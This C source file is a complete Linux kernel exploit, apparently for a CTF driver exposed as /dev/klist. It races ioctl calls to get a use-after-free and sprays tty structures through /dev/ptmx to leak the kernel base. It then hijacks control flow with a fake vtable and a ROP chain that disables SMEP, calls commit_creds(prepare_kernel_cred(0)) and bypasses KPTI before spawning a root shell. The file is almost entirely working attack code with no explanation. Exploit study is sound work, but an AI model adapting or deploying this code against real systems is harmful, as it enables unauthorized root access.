#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <sys/prctl.h>
#include <stdint.h>
#include <sys/shm.h>
#include <sys/ipc.h>
#include <stdbool.h>
#define ADD_ITEM 0X1337
#define SELECT_ITEM 0X1338
#define REMOVE_ITEM 0X1339
#define LIST_HEAD 0X133A
void debug(){
    getchar();
}
int fd;

typedef struct _item{
	uint64_t size;
	char* buffer;
}item;


void select_item(int64_t index){
	ioctl(fd,SELECT_ITEM,index);
}
void add(size_t size,char* buf){
	item* it = (item*)malloc(sizeof(item));	
	it->size = size;
	it->buffer = buf;
	ioctl(fd,ADD_ITEM,it);
}
void remote(int64_t index){
	ioctl(fd,REMOVE_ITEM,index);
}
void list_head(char* buf){
	if(buf){
		ioctl(fd,LIST_HEAD,buf);
	}
}

void init()
{
	fd = open("/dev/klist", O_RDWR);
	if (fd < 0)
		exit(-1);
	puts("[*] init done!");
}
void errExit(const char* msg)
{
	puts(msg);
	exit(-1);
}
typedef int __attribute__((regparm(3)))(*commit_creds_func)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred_func)(unsigned long cred);
commit_creds_func commit_creds;
prepare_kernel_cred_func prepare_kernel_cred;
size_t user_cs, user_ss,user_rflags, user_sp ,user_gs,user_es,user_fs,user_ds;
void save_status(){
	__asm__("mov %%cs, %0\n"
	"mov %%ss,%1\n"
	"mov %%rsp,%2\n"
	"pushfq\n"
	"pop %3\n"
	"mov %%gs,%4\n"
	"mov %%es,%5\n"
	"mov %%fs,%6\n"
	"mov %%ds,%7\n"
	::"m"(user_cs),"m"(user_ss),"m"(user_sp),"m"(user_rflags),
	"m"(user_gs),"m"(user_es),"m"(user_fs),"m"(user_ds)
	);
	puts("[*]status has been saved.");
}

void shell(void) {
	if(!getuid())
		write(1,"Hack success!",13);
		system("/bin/sh");
	exit(0);
}

void getroot() {
	commit_creds(prepare_kernel_cred(0));
}
void sudo(){
	shell();
}
int main(int argc, char const *argv[]){
	save_status();
	bool uaf = false;
	init();
	int size = 0x280-24;
	char* buf = (char*)malloc(0x400);
	char* result = (char*)malloc(0x1000);
	uint64_t *data = NULL;
	for(int i=0;i<0x400;i++){
		buf[i] ='a';
	}
	add(size,buf);
	if(fork()==0){
		for(int i = 0;i<500;i++){
			list_head(result);
			if (*(int *)result == 1){
				break;
			}
		}
		//sleep(1000);
		exit(0);
	}
	int j = 0;
	for(;j<500;j++){
		add(size,buf);
		list_head(result);
		printf("%d\n",((int*)result)[0]);
		if (*(int *)result == 1){
			printf("[+] now we trigger a UAF chunk,with [%d] chunk\n",j);
			uaf = true;
			break;
		}
	}
	if(uaf == false){
		errExit("Do not trigger UAF");
	}
	int fd_evil[2];
	pipe(fd_evil);
	char evil_buff[0x2000];
	memset(evil_buff,'E',0x2000);
	select_item(0);
	write(fd_evil[1],evil_buff,sizeof(evil_buff));
	read(fd_evil[0],evil_buff,sizeof(evil_buff));


	int fd_ptmx = open("/dev/ptmx",O_RDWR);

	read(fd,result,0x1000);
	data = (uint64_t*)result;
	if(data[0x400/8-3] != 0x100005401){
		errExit("TTY spray failed");
	}
	uint64_t kernel_base = data[0x418/8-3] - 0xe6fba0;
	printf("Kernel_base is : %lx\n",kernel_base);
	commit_creds = (commit_creds_func) (kernel_base + 0x745f0);
	prepare_kernel_cred = (prepare_kernel_cred_func) (kernel_base + 0x74950);

	
	void *fake_vtable = (void*)0xccdd0000;
	if(mmap(fake_vtable,0x20000,7,MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED,0,0) != fake_vtable){
		errExit("MMAP fail");	
	}
	memset(fake_vtable,'a',0x20000);	

	uint64_t* tmp = (uint64_t*)fake_vtable;
	//uint64_t ret = kernel_base + 0x6006c;
	uint64_t xchgx = kernel_base + 0x2f2c6;//xchg eax, esp; ret;
	for(int i =0;i<0x10;i++){
		tmp[i] = xchgx ;	
	}
	void *fake_stack = (void*)(xchgx&0xfffff000);
	if(mmap(fake_stack,0x10000,7,0x32,0,0) != fake_stack){
		errExit("MMAP fail");	
	}
	tmp = (uint64_t*)(xchgx&0xffffffff);
	tmp[0] = kernel_base + 0xb79;//pop rdi; ret; 
	tmp[1] = 0x6f0;
	tmp[2] = kernel_base + 0x3ff27;// pop rdx; ret; 
	tmp[3] = 0;
	tmp[4] = kernel_base + 0x47ba7;// mov cr4, rdi; push rdx; popfq; ret;
	//get root
	tmp[5] = kernel_base + 0xb79;//pop rdi;ret
	tmp[6] = 0;
	tmp[7] = (uint64_t)prepare_kernel_cred;
	tmp[8] = kernel_base + 0x84d45d;//mov rdi, rax; je 0xa4d467; mov rax, rdi; pop rbx; ret;  
	tmp[9] = 0;
	tmp[10] = (uint64_t)commit_creds;
	//bypass kpti
	tmp[11] = kernel_base + 0xa00985;//swapgs_restore_regs_and_return_to_usermode+0x16
	tmp[12] = 0;
	tmp[13] = 0xdeadbeef;
	tmp[14] = (uint64_t)&sudo;
	tmp[15] = user_cs;
	tmp[16] = user_rflags;
	tmp[17] = user_sp;
	//tmp[17] = (uint64_t)fake_vtable+0x8000;
	tmp[18] = user_ss;


	data[0x418/8-3] = (uint64_t)fake_vtable;
	write(fd,result,0x1000);
	//read(fd,result,0x1000);
	//data = (uint64_t*)result;
	//for(uint64_t z = 0;z<0x1000/8;z++){
	//	printf("%lx : %lx\n",(z+3)*8,data[z]);
	//}
	printf("Hijack control flow to:0x%lx\n",xchgx);
	debug();
	write(fd_ptmx,result,0x1000);
	return 0;	
}

